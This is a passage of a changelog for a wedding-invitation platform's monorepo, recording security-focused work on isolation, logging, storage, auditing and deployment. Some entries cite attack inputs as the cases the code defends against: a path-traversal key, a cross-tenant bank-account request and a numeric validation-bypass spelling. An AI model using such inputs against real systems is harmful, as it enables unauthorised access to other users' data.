- Also refused in production: a signing key under 32 characters, a non-HTTPS origin, a localhost database. Exit 78, every violation named at once — reporting one at a time means a restart per mistake, which is how people end up commenting out validation.
- **Secret scanning blocks at commit time**, not at push. A leaked credential is not recoverable by deleting the commit: once it reaches a shared history it is rotated or it is compromised. The scanner never prints the value it found — a scanner that echoes a secret into a terminal, a CI log and a screenshot has moved the leak rather than stopped it.
- `deploy/SECRETS.md` gives twelve secrets a rotation procedure and, more usefully, a **blast radius**. `JWT_SIGNING_KEY` signs every user out unless rotated through a dual-key window; `REFRESH_TOKEN_PEPPER` cannot be rotated without ending every session; a Midtrans rotation makes in-flight webhooks fail verification and look like forgeries.

**Testing** — 22 tests, two mutation checks. Removing the live-key rule failed 5 tests; removing the sandbox-in-production rule failed 2.

**Noted** — the scanner flagged one of our own tests on its first run: the fake JWT fixture that proves the `P0-12` redactor scrubs JWTs. Exactly the false-positive class the script's comments predicted, resolved through the documented escape.

### 2026-09-10 — object storage, with the path as a control

**Added** — `@wi/storage` ([P0-16](./records/2026-09-10-P0-16-object-storage.md))
- A `StoragePort` with an S3 implementation (MinIO locally, Cloudflare R2 in production), an in-memory fake for unit tests, and the path scheme from `docs/ARCHITECTURE/05`.
- **The path is a tenant isolation control, not a format.** The document says it carries `invitation_id` "for isolation & audit purposes", and a control any call site can assemble is not a control. `StorageKey` is a branded type only the builders can produce, so a caller with a string does not have a key — the compiler stops a hand-built path rather than a reviewer.
- Every component is validated, not just interpolated. The case worth naming is `{valid-uuid}/../../other`: a naive `startsWith` check passes it and the object lands outside the invitation's prefix.
- **The port has no `getPublicUrl`.** `docs/ARCHITECTURE/05` says files "must never be accessible directly via the bucket URL", and a method returning one would be used. `presignGet` is time-bounded instead.
- A third bucket, `staging`, for uploads that have passed only the extension, MIME and magic-byte checks — not the malware scan, not the decode, not the EXIF strip. Its own key shape, so an unscanned file is not reachable from anything that looks like a media path.
- `move` copies before deleting, fixed in the port. A failed delete leaves an orphan the hourly cleanup removes; a delete before the copy would lose the file.
- Shared as a **package**, because the API receives uploads and the worker writes variants. The `P0-15` record flagged duplicating the logger across those two surfaces; this does not repeat it.

**Verified against real MinIO** — an unauthenticated GET of a real object returns 403, so does the staging bucket, so does anonymous listing, and a signed URL works with a bounded expiry. That last test is what proves the three denials are the bucket policy rather than an unreachable endpoint.

**Open** — `OQ-19`: `docs/ARCHITECTURE/05` and `docs/BACKEND/04` disagree on the variant names, and neither is a superset. The builder accepts all four rather than guessing, because the filename is the CDN cache key and being wrong means rewriting every stored object.

### 2026-09-10 — the worker, and three silent failure modes closed

**Added** — the queue and worker skeleton ([P0-15](./records/2026-09-10-P0-15-queue-worker-skeleton.md))
- A worker process separate from the API, with the three pools `docs/BACKEND/08` specifies. `media` is CPU-capped because it decodes untrusted images; `general` is IO-bound; `cron` must run as one logical instance.
- **The documented idempotency pattern is racy and the implementation does not copy it.** `docs/BACKEND/08` shows check-then-mark as two operations — two workers can both pass the check before either marks, which for a payment webhook credits an order twice. `SET key value NX EX` makes the check and the claim one operation. Proven with ten concurrent claimers: exactly one wins.
- **A failed attempt releases its claim.** Otherwise "retry 3 times" becomes "try once, then no-op twice, then dead-letter" — producing exactly the same log lines as three genuine failures.
- One job catalogue holds every retry policy and an **explicit** dead-letter decision per job. `docs/ARCHITECTURE/07` says a failed high/medium job must never be silently dropped; a test asserts that directly. `analytics_counter_flush` is the only job permitted to lose work, and says so.
- Cron leader election, so a second instance does not send every couple two reminder emails. It is a **lease, not consensus** — under a Redis failover two instances can briefly both lead, and what makes that safe is idempotency rather than the lock.
- Cron schedules carry `tz: Asia/Jakarta`. The documented times are WIB, and a container in UTC would run "daily at 00:05 WIB" seven hours late, every day, with nothing looking wrong.

**Known limitation** — the worker's logger does **not** redact. `P0-12`'s redactor lives in `@wi/api` and cannot cross the package boundary yet, so the worker logs only fields it constructs and never a whole payload. That is a discipline rather than a mechanism, which is what `docs/DEVOPS/06` says redaction must not be. A shared logging package is `P0-19`.

**Testing** — 21 tests, 15 against a real Redis. Three mutation checks: a non-atomic claim, a missing release, and dead-lettering on every attempt each failed exactly the tests claiming to cover them.

### 2026-09-10 — changes that record themselves

**Added** — the audit and status writers ([P0-14](./records/2026-09-10-P0-14-audit-status-writers.md))
- **`AuditLogService.record(tx, entry)` takes a transaction and cannot open one.** A caller physically cannot record an action and then have that action fail separately. An audit row that commits when the change rolled back is a false record — and the worst kind, because it is indistinguishable from a true one.
- **`InvitationStatusService` is the only path that writes `invitations.status`**, enforced by `scripts/check-status-writes.mjs`. `docs/DATABASE/04` requires every transition to write history at the service layer, so `changed_by` and `reason` carry context a trigger could not see. The guarantee is only worth its exclusivity: one direct update in a hotfix produces an invitation whose journey nobody can reconstruct.
- The state machine is an **allowlist** — `docs/PLAN/06` plus the ADR-019 refund edge and the `DELETE /invitations/:id` soft-delete. A transition nobody designed cannot happen by accident.
- **`pending_payment → paid` is SYSTEM-only, admins included.** An admin who can mark an order paid by hand can grant a free product; that is a fraud path wearing a helpful hat. The correct fix for a missing webhook is a server-initiated provider query, which `docs/SECURITY/07` already allows.
- Backward transitions require a reason. It is what someone reads months later deciding whether a refund was legitimate, and the only moment anyone knows it is when it happens.
- The row is locked `FOR UPDATE` before the decision, so two concurrent transitions cannot write incompatible histories.
- Snapshot trimming reuses `P0-12`'s redactor: a value that must not sit in a 90-day log certainly must not sit in a table with **2-year** retention.

**Testing** — 19 tests, 169 across seven suites, with three rollback tests against a real database. Two mutation checks. A bug was caught by a test that loops over four starting states: a first-match rule lookup let the SYSTEM 90-day sweep shadow a user's own delete, so a user could delete an invitation in every state **except** `expired` — the one they most want gone. A single-state test would have passed.

### 2026-09-10 — one response shape, and errors that cannot leak

**Added** — the HTTP contract ([P0-13](./records/2026-09-10-P0-13-envelope-errors-health.md))
- The success and error envelopes from `docs/API/00`, verbatim including `snake_case`. The API contract is where this repository's TypeScript conventions stop and the document's start.
- **The exception mapper works from an allowlist.** Only our own domain errors and Nest's `HttpException` contribute to a response, and from the latter only the status. Everything else — a pg error, a `TypeError`, a thrown string — produces a fixed message. A Postgres error message contains the failing SQL and the constraint name; a Node error contains a file path. Neither author was thinking about the API contract, and no care at the call site fixes that.
- **There is no `ForbiddenError` for another user's resource**, by construction: it accepts only `FORBIDDEN` and `EMAIL_NOT_VERIFIED`. ADR-018 is kept by the type system rather than by discipline. An unknown route and a not-yours resource also return **byte-identical** bodies, because a difference there is the same enumeration oracle arriving through a message instead of a status code.
- Pagination **rejects rather than clamps**. Silently turning `per_page=1000` into 100 makes a paginating client skip records, and that surfaces as missing data much later in someone else's code. `page` and `per_page` require plain decimal digits — `Number("1e3")` is 1000, and several spellings of one value is the shape of a validation bypass.
- `/readyz` joins `/health`. Liveness touches no dependency, because a liveness probe that checks the database restarts every healthy replica during a blip and turns one outage into two. Readiness does check, and names **which** dependency is down but never why.
- Security headers per `docs/SECURITY/08`: `nosniff`, `X-Frame-Options: DENY`, HSTS, a CSP baseline, `Referrer-Policy: no-referrer`.
- `test/support/envelope-assertions.ts` is the shared helper later endpoint tests use. It asserts leakage on **every** error it checks, so each new endpoint test gets that for free.

**Found by running it** — readiness returned a correct 503 and logged `error: ""`. `pg` throws an `AggregateError` with an **empty message**, putting the cause in `.code` and `.errors[]`. Nothing failed and no test would have caught it; an operator would have had a 503 with no reason and correct-looking code to re-read.

### 2026-09-10 — logs that cannot leak

**Added** — structured logging ([P0-12](./records/2026-09-10-P0-12-structured-logging.md))
- JSON in the shape `docs/DEVOPS/06` § Format specifies: `timestamp`, `level`, `service`, `request_id`, `message`, `context`.
- **Redaction happens inside the logger.** `docs/DEVOPS/06` is explicit that it must not rely "on manual developer discipline each time", and that parenthetical is the whole design: a rule people have to remember holds until the first 2am incident, when someone logs the entire request object — which is exactly when the log is read by the most people and kept the longest.
- It is a **walk keyed on field name at any depth**, not a list of paths. A path list needs an entry per shape and misses anything nested or renamed. It also scrubs bearer tokens and JWTs out of *values* under innocent keys, because `{ note: "Authorization: Bearer ..." }` is how a token actually reaches a log.
- Secrets are removed; account numbers keep their last four digits and emails become `a***e@example.com`. A partial token has no debugging value; a partial account number is what support needs.
- **`request_id` is ambient** via `AsyncLocalStorage`, so a line written three layers deep inside a repository still carries it. Threading a logger through every constructor fails the moment one is missed — and that line is invariably the one needed.
- Bounded and cycle-safe: depth 8, arrays capped, circular references marked. Logging must never be what takes the service down.
- **Security events are tagged `log_type: "security"`** so retention can differ — 1 year against 90 days (`docs/DEVOPS/06` § Log Retention). Separation is by field rather than a second file: the aggregator routes on it, and a security log that fills a disk stops being written.
- The envelope that carries `request_id` across the queue exists and is tested through a JSON round trip. There is no queue until `P0-15`.

**Testing** — 34 tests. Verified through the **compiled production path**, not only the test harness. Two mutation checks; the first exposed a flaw in the test design itself: the main redaction test generates its payload from the redactor's own key list, so deleting a key removes it from both sides. An independent backstop taken from `docs/DEVOPS/06` now catches that. **A test generated from the code it tests verifies consistency, never correctness.**

### 2026-09-10 — tenant isolation, built before the endpoints that need it

**Added** — the tenant-scoped repository layer ([P0-11](./records/2026-09-10-P0-11-tenant-scoped-repository.md))
- `docs/SECURITY/05` is the project's number-one security priority with zero tolerance for regressions, and every `:id` endpoint in Phases 1 to 5 will sit on this. Building it first means never writing one wrong, instead of auditing them all later.
- **The unsafe query is absent from the exported surface**, not merely discouraged. `TenantScope` is a branded type constructed only by `tenantScope(userId)`, so a bare string — a slug, an invitation id, a variable from the wrong line — does not type-check where an owner filter belongs.
- **Non-owner, soft-deleted and non-existent all return `null`.** The service above cannot return a 403 that confirms a resource exists (ADR-018), because it never learns the difference.
- **Sub-resource access applies both conditions in one query.** `docs/SECURITY/05` § 7 asks for two validations; two round trips leave a state where someone has done the first and moved on. The attack this closes is `PATCH /invitations/{mine}/bank-accounts/{someone-elses}` — real parent, real child id, and only the second condition stops the write.
- **The admin bypass writes its own audit row inside the read's transaction**, so there is no way to obtain the data without leaving the trail — and it **fails closed** if the audit write fails, per `docs/SECURITY/00`.
- `scripts/check-tenant-scope.mjs` fails the build when anything outside the tenancy layer imports an invitation table directly. Blocking in `pre-push` and `scripts/verify.sh`.
- The application's database connection now exists, as the **unprivileged** role — it cannot alter the schema it queries.

**Testing** — 27 isolation tests, 145 across five suites. **Every test seeds two users**: a single-user fixture proves nothing about isolation. Four mutation checks — removing the owner filter, the parent-id condition, the child owner condition, and the audit insert — each failed exactly the tests claiming to cover them.

**Fixed** — the five integration suites now share one `resetTenantData()` using `TRUNCATE ... CASCADE`. Each suite used to clear the tables it knew about in the order it believed correct, which stopped working the moment a suite left rows another suite's cleanup could not remove: twenty failures, none in the code under test. Noted as a follow-up in three previous records without being acted on; this is what that cost.

### 2026-09-10 — the commercial tables, and the schema is complete

**Added** — five tables ([P0-10](./records/2026-09-10-P0-10-orders-payments-schema.md))
- `packages`, `addons`, `orders`, `payments`, `audit_logs`, matching `docs/DATABASE/07`, `08` and `10`. **Phase 0's schema is now complete at 28 tables.**
- **`UNIQUE (provider, provider_reference_id)` is the entire webhook idempotency story.** A provider retrying a delivery is normal traffic, not an error, and this lives in the database rather than in application code because a guarantee depending on every future handler remembering to check first is not a guarantee. The `ON CONFLICT DO NOTHING` upsert the service will use is verified here, so `P3-05` builds on something tested.
- **`audit_logs` is append-only by permission**, not by convention: the migration revokes `UPDATE` and `DELETE` from the application role. An audit trail the application can rewrite is not an audit trail — the code an attacker would be running is exactly the actor it exists to constrain. The revoke is scoped, and a test proves ordinary tables are still writable.
- `signature_valid` is a nullable three-state, so a forged callback is **recorded** rather than dropped. A spike in `false` is an alerting condition (`docs/DEVOPS/07`), and you cannot alert on rows you threw away.
- Money is `BIGINT` rupiah in all four price and amount columns, asserted by type rather than trusted. `orders.amount_total` is a snapshot: a test changes the package price and confirms existing orders are untouched.
- Seeded per ADR-023: one active package, `standard`, Rp 139,000, 12 months, 200 photos, no watermark. Both addons ship **inactive** — `custom_domain` is not sellable until `P7-01` (ADR-022), and `extended_validity` is redundant beside a 12-month package.

**Fixed** — `scripts/db-roundtrip.sh` now reseeds the master price tables and asserts the append-only grant. The `0004` down migration drops `packages`, so a round trip previously left the orders suite failing on a missing package — a failure that looks like a schema bug and is not.

**Testing** — 123 constraint tests across four suites. The append-only tests connect as the **application role**; run as the owner they would pass whether or not the revoke ever happened. Two mutation checks: granting `UPDATE`/`DELETE` back, and narrowing the payments unique index, each failed exactly the tests claiming to cover them.

### 2026-09-10 — the invitation aggregate

**Added** — thirteen tables ([P0-09](./records/2026-09-10-P0-09-invitations-schema.md))
- The invitation parent, eleven children, and the daily view counter, matching `docs/DATABASE/04`, `05`, `06`, `09` and `11`.
- **Two directions of referential rule, deliberately opposite.** Everything an invitation *owns* cascades away with it — eleven children plus its media. Everything an invitation *depends on* refuses deletion while in use: owner, template and template version are all `RESTRICT`. Both directions are tested, because neither is visible from reading the migration.
- `seo_indexable` defaults to **false**. A wedding invitation carries names, addresses, times and a guest list; it must not enter a search index because nobody thought to turn indexing off.
- `invitation_status_history.changed_by` is nullable — an expiry sweep or a payment webhook has no acting user, and `NOT NULL` would force a fake actor into the audit trail.
- `invitation_preview_tokens` and `invitation_view_counts` are included although the task card lists neither: no other schema task owns them, and the goal says the aggregate exists in full.
- **ADR-032 closed** — `media.invitation_id` now has its foreign key, `ON DELETE CASCADE`.

**Fixed** — **`docs/DATABASE/04-INVITATIONS.md` contradicted its own Notes** and is amended (ADR-033). It declared `slug VARCHAR(50) UNIQUE` while stating two sections later that a slug can be reused after the old invitation is truly deleted — which a column-level `UNIQUE` makes false. This is the second file needing the same correction after `users.email` (ADR-031): the specification used `UNIQUE` as a reflex without accounting for soft delete. `users` and `invitations` are the complete affected set.

**Testing** — 93 constraint tests across three suites. Four mutation checks: dropping the `guest_count` range, the `(invitation_id, role)` uniqueness, the `seo_indexable` default, and the ADR-032 foreign key each failed exactly the tests claiming to cover them. A sweep test asserts that every table with an `updated_at` column has a trigger maintaining it — written against `information_schema` so it covers tables that do not exist yet.

### 2026-09-10 — the template catalog and media

**Added** — four tables ([P0-08](./records/2026-09-10-P0-08-templates-media-schema.md))
- `templates`, `template_versions`, `media`, `template_assets`, matching `docs/DATABASE/03` and the `media` block of `06`.
- **Two delete rules, deliberately opposite.** `template_versions → templates` is `RESTRICT` because BR-3.3 says a version an invitation still renders from is deprecated, never deleted — a cascade would turn a catalog tidy-up into broken wedding pages. `template_assets → template_versions` is `CASCADE`, because an asset has no meaning without its version. They look inconsistent and are not; three tests pin them.
- `sections` and `theme` are JSONB with **no** database-level validation: `docs/DATABASE/03` puts that JSON Schema in application code (`P0-20`), where it can be versioned with the validator.
- `category` and `customizable_theme_keys` are real `varchar(n)[]` arrays, asserted as `ARRAY` rather than assumed — one of the concrete reasons ADR-007 picked Drizzle over Prisma.
- `media.status` defaults to `processing`: a row exists before the `docs/SECURITY/06` pipeline has run, and defaulting to `ready` would make a failed scan invisible.

**Deferred** — `media.invitation_id`'s **foreign key** lands in `P0-09` (ADR-032). `invitations` does not exist yet and `template_assets` needs `media` now, so no ordering satisfies every foreign key in one migration. The column, type, nullability and index are exactly as documented. A test asserts the constraint is currently absent and must be *replaced* when `P0-09` adds it — a test that flips to failing is a louder reminder than a note.

**Worth knowing** — `RESTRICT` raises SQLSTATE **23001** (`restrict_violation`); `NO ACTION` raises **23503** (`foreign_key_violation`). Both occur in this schema. Application code that maps only 23503 to a friendly "still in use" message will return a 500 for the RESTRICT case, which is the more common one.

### 2026-09-10 — the users and auth schema

**Added** — six tables ([P0-07](./records/2026-09-10-P0-07-users-auth-schema.md))
- `users`, `user_notification_preferences`, `refresh_tokens`, `user_tokens`, `user_mfa_factors`, `user_recovery_codes`, matching `docs/DATABASE/02-USERS.md` column for column, with `updated_at` triggers and a down migration.
- **The card named three tables; the document defines six.** The extra three are auth support in the same file, and shipping only three would have left `P1-04` (email verification) and `P5-02` (admin TOTP) adding tables from tasks that are not about schema.
- Only hashed or encrypted material is stored: `password_hash`, `token_hash`, `code_hash`, and `secret_encrypted` as `BYTEA`. A database read must not yield a usable credential.
- Every child table cascades from `users`, so a hard delete cannot leave a refresh token that still authenticates.

**Fixed** — **`docs/DATABASE/02-USERS.md` contradicted itself** and is amended (ADR-031). It declared `email VARCHAR(255) NOT NULL UNIQUE` *and* a partial unique index limited to `deleted_at IS NULL`. A column-level `UNIQUE` covers soft-deleted rows too, making the partial index unreachable and holding a deleted account's address until the hard delete ran a retention period later — the opposite of what `docs/SECURITY/09` and the task's own goal describe. The partial index is now the only uniqueness rule.

**Testing** — `pnpm --filter @wi/api test:integration` runs 22 constraint tests against a real PostgreSQL 18. They **fail rather than skip** when no database is reachable, because a skipped schema suite reports green for constraints nobody checked. Three were mutation-checked — dropping `idx_users_email`, `users_role_check` and the `updated_at` trigger each failed exactly the tests claiming to cover them.

### 2026-09-10 — migrations, and PostgreSQL 18

**Added** — migration tooling ([P0-06](./records/2026-09-10-P0-06-migration-tooling.md))
- `db:generate`, `db:migrate`, `db:rollback`, `db:seed`. Migrations are a deliberate step: nothing in the application imports the migrator, so a rolling deploy cannot have every replica race to alter the schema.
- **Two roles, two URLs.** Migrations connect as the owner; the API connects as a role that cannot alter schema. That split is a precondition for row-level security — an owner connection bypasses every policy silently — and it is verified from the failing side: `CREATE TABLE` as the application role returns `permission denied`.
- **The baseline creates no tables**, only `set_updated_at()`. Almost every table carries `updated_at DEFAULT NOW()`, and a default fires only on INSERT — without the trigger the column records creation time forever and lies on every edited row. The `WHEN (OLD.* IS DISTINCT FROM NEW.*)` clause keeps a no-op UPDATE from bumping it; both directions verified.
- **No `CREATE EXTENSION`.** `gen_random_uuid()` has been core since PostgreSQL 13, and `CREATE EXTENSION` needs superuser — a privilege the migration role now never has to hold.
- **Expand-contract is enforced, not documented.** A migration containing `DROP TABLE`/`DROP COLUMN`/`TRUNCATE` fails unless the file carries a `CONTRACT-PHASE:` justification. Drizzle emits `DROP COLUMN` for a simple rename, and that reads as routine in a diff.
- Drizzle generates no down migrations (ADR-030), so they are written by hand and a gate fails when one is missing — or when one is orphaned by a deleted migration. **`db:rollback` is a development tool, not production recovery**: reversing schema over live data is lossy, and `docs/DEVOPS/08` relies on expand-contract instead.
- `pnpm db:roundtrip` proves up → down → up against a real container, 9 assertions.

**Changed** — **PostgreSQL 16 → 18** (ADR-029), at the owner's request.
- The compose volume mount moved with it. PG18's image relocated `PGDATA` to `/var/lib/postgresql/18/docker` and declares `VOLUME /var/lib/postgresql`; the previous mount would **not** have errored — it would have mounted an empty named volume, written the real data to an anonymous one, and lost it on the first `docker compose down`, leaving a volume that still looked correct. Fix verified by writing a row, cycling the stack, and reading it back.
- Any existing local volume holds a version-16 cluster an 18 server will refuse. `docker compose -f deploy/docker-compose.yml down -v` clears it — free today, which is the argument for doing this now rather than at `P0-23`.

### 2026-09-10 — CI deferred, and the one gate that could not go with it

**Changed** — `P0-17` is **deferred**, not done ([record](./records/2026-09-10-P0-17-ci-deferred-local-gates.md), ADR-028)
- No GitHub Actions workflow was written. The project merges locally, so a `pull_request` pipeline would have triggered on nothing while sitting in the repository looking like a control.
- **`.githooks/pre-push` now blocks** a push that adds an `:id` endpoint without touching a test. `scripts/check-id-endpoint-tests.mjs` was built in `P0-03` to enforce the zero-tolerance rule in `docs/SECURITY/05`, and the pipeline was going to be its only caller — deferring CI without moving it would have returned the project's most important security rule to being a checklist item. Tested both directions: refused on a diff with no test, passed once a test was added.
- **`scripts/verify.sh`** runs what the pipeline would have run — format, lint, typecheck, test, the `:id` gate, the Helm chart, build. Run it before merging to `main`. Its output ends by listing what it does *not* cover, so a green run cannot be read as "CI passed".

**Not running anywhere until `P0-17` is picked up** — integration tests against real Postgres and Redis, the 80% service-layer coverage floor, SAST, dependency CVE scanning, and required reviewer approval. Local hooks are also bypassable with `--no-verify` and absent on a fresh clone until `pnpm install`. **Revisit before Phase 3**: `docs/SECURITY/07` and `P3-16` assume a pipeline that can reject a change to payment code.

**Fixed** — prettier was parsing Helm templates as YAML and failing `format:check` repository-wide. This shipped in `P0-26` because I ran lint, typecheck and test before committing but not `format:check`; the new `scripts/verify.sh` caught it on its first run, which is the argument for it existing.

### 2026-09-10 — the Kubernetes path exists on paper, and it lints

**Added** — `deploy/helm/` ([P0-26](./records/2026-09-10-P0-26-helm-charts.md))
- A chart deploying the API and the three worker pools (`media`, `general`, `cron`), with an ingress that keeps the public invitation origin separate from the authenticated application (ADR-024).
- **This is not the MVP deployment path.** ADR-015 stands: the MVP runs on one VPS with Docker Compose. The chart exists so that leaving a single host — risk R14 — is a deployment change rather than a project.
- **Two configurations the chart refuses to render.** A missing `image.tag`, because "roll back to the previous image" is the whole recovery plan and a moving tag makes that sentence meaningless. And `workers.pools.cron.replicaCount > 1`, because a second cron instance runs every scheduled job twice — two reminder emails to a real couple, silently, not an error in a log. Both were triggered deliberately and both fired.
- Every workload runs non-root with a read-only root filesystem, `seccompProfile: RuntimeDefault`, all capabilities dropped and resource limits set — asserted across all four rendered Deployments, not assumed from the helper.
- No credential is in the chart. Secrets come from a Secret that already exists in the namespace, via `envFrom` (`P0-18`).

**Known gap** — Kubernetes **schema** validation was not performed: `kubectl apply --dry-run` needs a reachable API server and there is no cluster here. The manifests are known to render and to be well-formed; they are not known to be accepted by a real Kubernetes version. `P0-23` owns that check.

### 2026-09-10 — the local stack runs

**Added** — `deploy/` and the local environment ([P0-05](./records/2026-09-10-P0-05-local-environment.md))
- `docker compose -f deploy/docker-compose.yml up -d` brings up PostgreSQL, Redis, MinIO, Mailpit and the API. The API waits for its dependencies to report **healthy**, not merely started.
- Multi-stage API image: non-root runtime with no package manager, no source and no dev dependencies. Healthcheck runs the app's own runtime rather than adding curl to the image.
- **Two things set up before there is anything to protect.** The application connects as a role that does not own its tables and has neither `SUPERUSER` nor `BYPASSRLS` — the moment row-level policies exist, an owner connection would bypass every one of them and no test would fail. Both storage buckets are created private; an unauthenticated GET returns 403, verified.
- ClamAV sits behind a compose profile: it holds about a gigabyte and nothing needs it before `P1-18`. A stack that is slow to start is a stack people stop starting.
- Host ports are overridable — forced by three real collisions (1025, 8025, 6379) on the development machine. A hardcoded host port turns "something else uses 6379" into "the stack will not start".
- A minimal `/health` (liveness only) was added ahead of `P0-13`, because the container healthcheck needs one. `P0-13` still owns readiness.

**Fixed** — `.dockerignore` was beside the `Dockerfile`, where Docker never reads it. Every image builds from the repository root, so it belongs there; until it was moved, host `node_modules` was copied into the image and overwrote pnpm's symlink farm, failing as `MODULE_NOT_FOUND` on `tsc`.

### 2026-09-10 — surfaces separated

**Changed** — repository layout ([P0-25](./records/2026-09-10-P0-25-surface-directories.md), [ADR-027](./DECISIONS.md))
- `apps/` replaced by **`backend/{api,worker}`**, **`frontend/{web-app,public-invite}`** and **`admin/`**, alongside the unchanged `packages/`.
- `admin/` sits beside `frontend/` rather than inside it because `docs/SECURITY/02` puts it behind its own trust boundary, on its own hostname, with its own session. The layout should argue for the architecture, not against it.
- Moved with `git mv`, so `git log --follow` still traces every file.
- **A knowing divergence**: `docs/FRONTEND/00` § Project Structure still describes `apps/` and was left unamended at the project owner's instruction. `CLAUDE.md` and `AGENTS.md` now state both the real layout and the fact that the document disagrees, so a session reading them first is not misled.

### 2026-09-10 — the API runs

**Added** — backend service skeleton ([P0-04](./records/2026-09-10-P0-04-backend-service-skeleton.md))
- `apps/api` is a running NestJS service: environment validated before anything is constructed, the three surfaces from `docs/ARCHITECTURE/01` mounted separately (`/api/v1`, `/public`, `/api/webhooks`), the middleware chain documented as an ordering with positions 6-8 reserved for rate limiting (`P1-07`), authentication (`P1-06`) and the error mapper (`P0-13`).
- **Configuration fails loudly**: a missing variable stops the service with exit 78 and names *every* offending variable at once — reporting one per restart is how people end up commenting out validation. Reserved variables are listed with the task that makes each required.
- **Bounded drain on shutdown**: idle keep-alive sockets released, in-flight requests left to finish, capped so a stuck request cannot hang a rollout.
- **The shared-package boundary is proven, not assumed.** The API imports from `@wi/schema` and a test asserts the value arrives over HTTP. ADR-004 chose one language on the strength of that boundary; if it breaks, `P0-20` would be the expensive place to find out.
- 16 tests. Runtime behaviour also exercised by hand against the built output: all three surfaces answered, `X-Frame-Options: DENY` (helmet defaults to SAMEORIGIN; `docs/SECURITY/08` asks for DENY), and a configuration-less start exited 78.

**Fixed** — a build that reported success and emitted nothing
- `tsc`'s incremental state lived beside the config, so `rm -rf dist` left it behind and the next build concluded there was nothing to do. `tsBuildInfoFile` now lives inside `dist/`. Invisible from CI, because a clean checkout has no stale state — and its symptom was a *green* build.

**Changed**
- `packages/*` compile to CommonJS in `dist/` with declarations, so the CommonJS NestJS app can consume them.
- Install scripts are denied by default through pnpm's `allowBuilds` policy; each package is decided one at a time rather than the protection being switched off.
- `CLAUDE.md` and `AGENTS.md`: real setup commands, and the Node version corrected to 24 to match ADR-004 as amended.

### 2026-09-09 — implementation begins

**Added** — repository structure ([P0-02, P0-03](./records/2026-09-09-P0-02-P0-03-repo-scaffolding-and-conventions.md))
- pnpm + Turborepo monorepo: `apps/{api,worker,web-app,public-invite,admin}` and `packages/{schema,template-renderer,ui,api-client,config}`. The API carries the twelve domain modules, five shared concerns and four infra adapters from `docs/ARCHITECTURE/01` as real directories; the worker carries its three pools.
- The workspace graph is real rather than declared: `@wi/template-renderer` resolves from both `web-app` and `public-invite`, which is the property `docs/FRONTEND/04` depends on.
- Node pinned to **24 LTS** — ADR-004 named 22, which is now in maintenance. A version correction inside an accepted decision.

**Added** — traceability gates
- `commit-msg` hook rejecting any subject without a task ID, verified by execution.
- PR template requiring the task, the specification sections, test layers, the security review flag and the IDOR test for any new `:id` endpoint; `CODEOWNERS` marking `docs/SECURITY/`, `docs/DATABASE/` and `docs/API/` for explicit review.
- **The `:id` guard**: CI fails any diff that adds a route taking a path parameter without touching a test file, and its message names `docs/SECURITY/05` and the helper that makes the test a one-liner. `docs/SECURITY/05` has zero tolerance, and a convention people are asked to remember is one that gets skipped invisibly.
- `.gitattributes` forcing LF — unplanned, and added because git was rewriting shell hooks to CRLF, which fails in a Linux container far from where it was introduced.

**Changed** — branching strategy ([ADR-026](./DECISIONS.md))
- **One branch per phase** rather than per task: all of a phase lands on `feat/phase-<n>-<slug>`, which merges to `main` only when the phase's acceptance task is `DONE`. `main` carries no in-progress development code. Documentation-only changes still go to `main` directly.
- Phase 0 work moved to `feat/phase-0-foundation` before anything was committed, so `main` still holds only the four specification commits.

**Not done yet** — branch protection is not enabled on the GitHub repository, so `CODEOWNERS` and the CI checks are advisory until it is. That is a repository settings change.

### 2026-09-09 — gift account numbers reclassified

**Changed** — data classification and the encryption decision ([record](./records/2026-09-09-gift-account-data-reframing.md), [ADR-025](./DECISIONS.md))
- `invitation_bank_accounts.account_number` is **sensitive personal data the couple enters in order to publish**, so a guest who cannot attend can send a gift directly to their bank. It is **not a platform payment credential** — nothing in the system moves money with it. `docs/SECURITY/00` had grouped it with password hashes and tokens; that row is now split into "Critical — secrets" and "Critical — sensitive personal data".
- **`OQ-10` answered: no column-level encryption.** It would protect only the subset that is not already public — drafts and gift-disabled invitations — inside a database holding names, addresses, coordinates and full guest lists in plaintext beside it. Storage-level encryption of the whole store is the proportionate control, and column encryption would foreclose a genuine fraud query.

**Added** — the risk the reframing exposed
- **R16**: gift account tampering. An attacker who changes the number on a live invitation collects every guest's gift, and the couple finds out after the wedding. Confidentiality was never the property under threat here; integrity is, and no risk in the register had covered it.
- Bank account writes now carry an audit trail, and a **non-optional email** notifies the owner whenever gift details change on a published invitation — the way a bank confirms a payee change (`docs/PLAN/13`).
- `payments.raw_callback_payload` scoped separately and also left unencrypted: it is retained precisely so a signature can be re-verified in an investigation, which redaction would defeat.

### 2026-09-09 — pricing and publishing address decided

**Decided** — commercial model ([record](./records/2026-09-09-pricing-and-publishing-address.md), [ADR-023](./DECISIONS.md))
- **One package: Rp 139,000 for 12 months**, 200 photos at 10 MB, no watermark. The Basic/Premium split is gone — a single price means a single tier.
- **Free tier is one draft**: an account may hold at most one invitation that has never reached `paid`. A paid invitation stops counting, so a wedding organizer with five paid invitations can still start a sixth draft (new BR-1.4).
- Renewal is another Rp 139,000 for another 12 months. `addons` ships with **no active rows** — `custom_domain` waits for Phase 2, `extended_validity` is redundant beside a 12-month package.
- Read as a 12-month validity with manual renewal, **not** recurring billing; that interpretation is stated in the ADR rather than assumed.
- Knock-on effects: checkout stops being a comparison page (`docs/UI-UX/13`), media limits collapse to one row (`docs/PLAN/11`), and the watermark narrows to free drafts and previews only — no published invitation carries one (`docs/UI-UX/14`).

**Changed** — publishing addresses ([record](./records/2026-09-09-pricing-and-publishing-address.md), [ADR-024](./DECISIONS.md))
- Invitations are published at **`invitation.zedth.my.id/{slug}`** — path-based on a fixed hostname. **No wildcard DNS record and no wildcard certificate**, because programmatic DNS management is not in place yet.
- Three fixed hostnames, added as each surface is built: `invitation.zedth.my.id` (public invitations, previews, proxied public API), `app.zedth.my.id` (application and API, from `P0-23`), `admin.zedth.my.id` (admin, from `P5-01`).
- The public surface stays on **its own origin** rather than sharing one with the application. Guest-submitted content renders there, and a shared origin would let a stored XSS act against the authenticated app — a containment the wildcard design provided for free.
- Slug resolution is now **strategy-driven** (`docs/BACKEND/06`): path today, subdomain later, one implementation. Migration is configuration plus DNS, with published path URLs redirecting permanently and indefinitely.
- Per-invitation subdomains merge into `P7-01` alongside custom domains — the same programmatic-DNS capability serves both.
- New risk **R15**: an unreserved application route could shadow a published invitation. Closed by construction — that host serves only invitations, and CI fails on a route not present in `slug_blocklist`.
- 20 documents amended; `maindomain.com` placeholders replaced with the real hostnames throughout.

**Status** — `TASKS/PROGRESS.md` now shows **no blocked tasks**. Five open questions remain and none stops work.

### 2026-09-09 — stack decided, specification gaps closed

